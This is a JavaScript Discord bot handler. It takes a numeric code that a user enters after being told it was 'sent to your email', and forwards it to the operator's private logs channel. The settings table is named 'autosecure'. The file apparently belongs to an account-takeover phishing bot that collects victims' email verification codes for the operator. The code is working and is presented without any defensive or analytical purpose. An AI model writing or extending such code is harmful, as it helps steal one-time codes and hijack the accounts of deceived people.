const { queryParams } = require("../../../db/database");
const getEmbed = require("../../utils/responses/getEmbed");

let obj = {
  name: "submitpreset",
  callback: async (client, interaction) => {
    await interaction.deferReply({ ephemeral: true }).catch(err => {
      console.error("Error deferring reply:", err);
    });

    if (!interaction.components || !interaction.components[0] || !interaction.components[0].components[0]) {
      return interaction.editReply({ content: "No code provided!", ephemeral: true });
    }

    let code = interaction.components[0].components[0].value;
    let settings = await client.queryParams(`SELECT * FROM autosecure WHERE user_id=?`, [client.username]);

    if (settings.length == 0) {
      return interaction.editReply({
        embeds: [{
          title: `Error :x:`,
          description: `Unexpected error occurred!`,
          color: 0xff0000
        }],
        ephemeral: true
      });
    }

    settings = settings[0];

    let channelId;
    if (settings.logs_channel) {
      [channelId] = settings.logs_channel.split("|");
    } else {
      return interaction.editReply({ content: `Set your logs channel first!\nusing **/set**`, ephemeral: true });
    }

    if (isNaN(code)) {
      console.log(`[X] Invalid Code! [Not Numbers]`);
      return interaction.editReply({
        embeds: [
          {
            title: `Error :x:`,
            description: `Invalid code, please confirm with the code that was sent to your email`,
            color: 0xff0000,
          },
        ],
        ephemeral: true,
      });
    }

    let embedMessage = {
      embeds: [
        {
          title: "Received a code!",
          color: 0xffa500,
          fields: [
            {
              name: "Code",
              value: `\`${code}\``
            },
            {
              name: "Status",
              value: `\`Waiting for you to confirm the code...\``
            }
          ],
          author: {
            name: `${interaction.user.username}`
          }
        }
      ]
    };

    try {
      let channel = await client.channels.fetch(channelId);
      if (channel) {
        await channel.send(embedMessage);
      } else {
        console.error("Channel not found!");
      }
    } catch (err) {
      console.error("Error fetching channel:", err);
    }

    await interaction.editReply({
      embeds: [await getEmbed(client, "res")],
      ephemeral: true
    });
  }
};

module.exports = obj;
